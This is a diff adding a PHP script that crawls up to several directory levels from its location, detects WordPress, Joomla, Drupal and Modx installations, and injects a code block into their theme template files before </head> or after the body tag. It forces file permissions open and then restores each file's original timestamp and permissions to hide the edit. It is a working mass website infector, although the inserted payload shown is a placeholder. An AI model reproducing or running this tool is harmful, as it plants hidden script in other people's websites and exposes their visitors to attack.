@@ -1,0 +1,214 @@
+$tag = '</head>';   //   <body.*> OR </head>
+
+$code = <<<CODE
+#test
+CODE;
+
+
+
+
+define(DEBAG,false);
+
+//API
+$signature = array(
+                   'wp-admin'=>array('engine'=>'Wordpress','path'=>'/wp-content/themes','file'=>'header.php'),
+				   'administrator'=>array('engine'=>'Joomla','path'=>'/templates','file'=>'index.php'),
+				   'authorize.php'=>array('engine'=>'Drupal_7','path'=>'/modules/system','file'=>'html.tpl.php'),
+				   'misc'=>array('engine'=>'Drupal_6','path'=>'/modules/system','file'=>'page.tpl.php'),
+				   'index-ajax.php'=>array('engine'=>'Modx','path'=>'/assets/templates','file'=>'.tpl|.php'),
+				   );
+				   
+$toFind = array_keys($signature);				   				   
+$dir = path_finder();
+
+$d=array();
+$d1=array();
+$d2=array();
+
+
+$res=smartscan($dir);
+if(count($match = array_values(array_intersect($res,$toFind))) > 0){
+   themesEditor($localpath = $dir, $pattern = $signature[$match[0]], $tag, $code);
+   }
+
+//add dirs to massive 1
+foreach($res as $v){
+    if(is_dir($dir.'/'.$v) && $v!=="." && $v!==".."){
+       $d[]=$dir.'/'.$v;
+       }
+    }
+   
+//scan 1-deep files
+foreach($d as $n){
+    $res2=smartscan($n);
+    if(count($match = array_values(array_intersect($res2,$toFind))) > 0){
+       themesEditor($localpath = $n, $pattern = $signature[$match[0]], $tag, $code);
+       }
+    
+    foreach($res2 as $l){
+        if(is_dir($n.'/'.$l) && $l!=='.' && $l!=='..'){
+           //add dirs to massive 2
+           $d1[]=$n.'/'.$l;
+           }
+		   
+        }
+    }
+
+//scan 2-deep files
+foreach($d1 as $n1){
+    $res2=smartscan($n1);
+    if(count($match = array_values(array_intersect($res2,$toFind))) > 0){
+       themesEditor($localpath = $n1, $pattern = $signature[$match[0]], $tag, $code);
+       }
+   
+    foreach($res2 as $l1){
+        if(is_dir($n1.'/'.$l1) && $l1!=='.' && $l1!=='..'){
+           //add dirs to massive 3
+           $d2[]=$n1.'/'.$l1;
+           }
+
+        }
+}
+
+//scan 3-deep files
+foreach($d2 as $n2){
+    $res3=smartscan($n2);
+    if(count($match = array_values(array_intersect($res3,$toFind))) > 0){
+       themesEditor($localpath = $n2, $pattern = $signature[$match[0]], $tag, $code);
+       }
+	   
+    }
+
+
+
+
+function themesEditor($localpath, $pattern, $tag, $code){
+    if(DEBAG){			
+	   if(@smartscan($fullpath = $localpath.$pattern['path']))
+		  echo 'Engine: '.$pattern['engine'].' --> Localpath:'.$localpath.'<br>';
+	   else
+		  echo 'Engine: '.$pattern['engine'].' --> Dir doesnt exist:'.$localpath.'<br>';
+	   }
+	else{
+	   $res=smartscan($fullpath = $localpath.$pattern['path']);
+	   $d=array();
+	   //add dirs to massive 1
+	   echo '<img src="img/cms/'.$pattern['engine'].'.png"><b>'.$pattern['engine'].'<br></b>';
+	   
+       foreach($res as $v){
+	       if(preg_match('#'.$pattern['file'].'#i', $v)){
+		      edit($fullpath.'/'.$v, $code, $tag);
+		      }
+           if(is_dir($fullpath.'/'.$v) && $v!=="." && $v!==".."){
+              $d[]=$fullpath.'/'.$v;
+              }
+           }
+
+       #print_r(scandir($d[0]));
+       //scan 1-deep files
+       foreach($d as $n){
+           $res2=smartscan($n);
+           foreach($res2 as $l){
+               if(preg_match('#'.$pattern['file'].'#i', $l)){
+			      edit($n.'/'.$l, $code, $tag);
+			      continue;
+		          }
+		       
+               }
+    
+           }
+	   }
+			   
+    }
+           			
+					
+function edit($filepath, $code, $tag){ 
+    clearstatcache();  
+    $perms = 0777 & fileperms($filepath); 
+	chmod($filepath, 0666);
+    if(is_writable($filepath)){
+       $content = file_get_contents($filepath);
+	   $tag_exists = false;
+       switch($tag){    
+           /*case "<head.*>":
+		        if(preg_match('#<head.*>#i',$content,$match)){
+		           $replacement = stristr($match[0],'everything') ? '<head>'."\r\n".$code : $match[0]."\r\n".$code;
+				   $tag_exists = true;
+			       break;
+				   }*/
+           case "</head>":
+		        if(preg_match('#</head>#i',$content,$match)){
+		           $replacement = $code."\r\n</head>";
+				   $tag_exists = true;
+		           break;
+				   }
+           case "<body.*>":
+		        if(preg_match('#<body.*>#i',$content,$match)){
+		           $replacement = $match[0]."\r\n".$code;
+				   $tag_exists = true;
+			       break;
+				   }
+           }
+	   
+	   if($tag_exists){
+          $lastmod = filemtime($filepath);
+          $inject = preg_replace('#'.$tag.'#i',$replacement,$content);
+          file_put_contents($filepath,$inject,LOCK_EX);
+	      touch($filepath,$lastmod);
+	      chmod($filepath, $perms);
+	      echo '&nbsp&nbsp&nbsp&nbsp&nbspSuccess >> '.$filepath.'<br>';
+	      }
+	   else{
+	      echo '&nbsp&nbsp&nbsp&nbsp&nbspTag Not Found >> '.$filepath.'<br>';
+		  return;
+		  }
+	      
+	   }
+	else{
+	   echo '&nbsp&nbsp&nbsp&nbsp&nbspCant Edit >> '.$filepath.'<br>';
+	   }
+	   
+    }
+					
+					
+function path_finder(){
+    $p=$_SERVER['SCRIPT_FILENAME'];
+	if(empty($p)){
+	   exit('Cant find the path');
+	   }
+	else{
+	   $p=str_replace('\/', '/', $p);
+	   $p=trim($p, '/');
+	   $p=substr_count($p, '/')-1;
+       }
+
+    for($k=1; $k<=$p; $k++){
+        if(!is_readable(str_repeat('../', $k))){
+        $pth=trim(str_repeat('../', $k-1));
+        break;
+        }
+	
+    }
+ 
+    if($pth){
+       return $pth;
+       }
+    else{
+       return trim(str_repeat('../', $p-1));
+       }
+ 
+ 
+    }
+
+
+function smartscan($dir){
+    if(function_exists("scandir")){
+       return scandir($dir);
+       } 
+	else{
+       $dh  = opendir($dir);
+       while(false !== ($filename = readdir($dh)))
+           $files[] = $filename;
+           return $files;
+       }
+    }
